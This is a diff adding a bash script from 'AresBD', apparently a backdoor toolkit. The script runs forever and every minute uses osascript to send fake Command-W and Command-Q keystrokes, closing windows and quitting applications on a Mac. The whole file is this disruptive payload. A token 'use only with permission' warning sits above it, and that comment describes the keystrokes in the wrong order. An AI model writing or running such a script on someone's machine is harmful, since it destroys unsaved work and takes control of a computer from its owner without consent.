@@ -1,0 +1,16 @@
+#!/bin/bash
+# AresBD Command-Q Script by Ohnx and Stsosz
+# This simulates a Command-Q Keypress and 3 Command-W Keypresses every minute. 
+# Don't be an asshole. Don't use this without permission. I'm not responsible for
+# Any stupid stuff you do with AresBD. 
+
+while true; do
+osascript -e 'tell application "System Events" to keystroke "w" using command down'
+sleep .01
+osascript -e 'tell application "System Events" to keystroke "q" using command down'
+sleep .01
+osascript -e 'tell application "System Events" to keystroke "q" using command down'
+sleep .01
+osascript -e 'tell application "System Events" to keystroke "q" using command down'
+sleep 60
+done
